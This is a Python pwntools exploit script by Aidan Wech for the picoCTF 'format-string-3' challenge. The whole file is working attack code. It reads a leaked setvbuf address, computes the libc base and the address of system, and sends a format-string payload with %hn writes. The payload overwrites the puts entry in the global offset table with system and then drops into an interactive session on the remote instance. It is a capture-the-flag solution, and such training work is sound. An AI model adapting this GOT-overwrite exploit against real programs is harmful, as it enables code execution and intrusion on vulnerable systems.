# picoCTF-format-string-3-exploit.py
# by Aidan Wech (ahwech)
# nc rhea.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "rhea.picoctf.net"
    port = 62023

    # debug varibles
    bin = ELF('./format-string-3')

    # variables
    setvbuf_offset = 0x7a3f0                            # libc offset for setvbuf
    puts_got_addr = 0x404018                            # global offset table address for puts
    format_addr_1_position = 42                         # format string position for first address to write to
    format_addr_2_position = format_addr_1_position + 1 # format string position for second address to write to
    libc = bin.libc                                     # libc variable

    # connect to instance
    p = remote(host, port)
    p.recvuntil(b'libc: ', timeout=1)
    
    # obtain leaked setvbuf address, determine system address from there
    # determine the numbers that '%n' format identifier will overwrite and corresponding addresses in the GOT
    setvbuf_addr = int(p.recvline(timeout=1).decode().rstrip("\n")[2:], 16)
    libc.address = setvbuf_addr - setvbuf_offset
    system_addr = libc.symbols['system']
    format_num_1 = (system_addr & 0xffff0000) >> 16
    format_num_2 = system_addr & 0xffff
    format_addr_1 = puts_got_addr + 2
    format_addr_2 = puts_got_addr

    # we want format_num_1 to go first
    if (format_num_1 > format_num_2):
        format_num_1 ^= format_num_2
        format_num_2 ^= format_num_1
        format_num_1 ^= format_num_2
        format_addr_1 ^= format_addr_2
        format_addr_2 ^= format_addr_1
        format_addr_1 ^= format_addr_2
    
    # make the bigger number compliant with '%n'
    format_num_2 -= format_num_1

    # create payload
    payload = flat(
        {
            0: f"%{format_num_1}x%{format_addr_1_position}$hn%{format_num_2}x%{format_addr_2_position}$hn",
            32: p64(format_addr_1)
        },
        p64(format_addr_2)
    )

    # deliver payload
    p.sendline(payload)
    with context.silent:
        p.recvuntil(b"@@", timeout=3)
    p.interactive()
    p.close()

if __name__ == "__main__":
    main()